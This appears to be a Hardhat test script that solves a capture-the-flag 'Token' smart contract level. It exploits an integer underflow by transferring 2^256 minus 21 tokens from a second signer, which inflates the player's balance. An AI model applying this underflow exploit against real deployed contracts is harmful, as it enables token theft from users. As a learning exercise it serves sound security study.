import { BigNumber, Contract, Signer } from "ethers";
import { ethers } from "hardhat";
import { setupTest } from "./utils";

let eoa: Signer;
let accomplice: Signer;
let challenge: Contract; // challenge contract

// Setup challenge level instance, eoa, attacker and before/after hooks
(async () => {
  const contractLevel = "0x478f3476358Eb166Cb7adE4666d04fbdDB56C407";
  const contractName = "Token";
  ({  challenge } = await setupTest(contractLevel, { contractName }));
  ([eoa, accomplice] = await ethers.getSigners())
})();

it("solves the challenge", async () => {
  const eoaAddress = await eoa.getAddress();
  const maxValue = BigNumber.from(2).pow(256)
  // Since we're given an initial 20 tokens, subtract 21 from maxValue to prevent overflow
  const tx = await challenge.connect(accomplice).transfer(eoaAddress, maxValue.sub(21));
  await tx.wait();
});
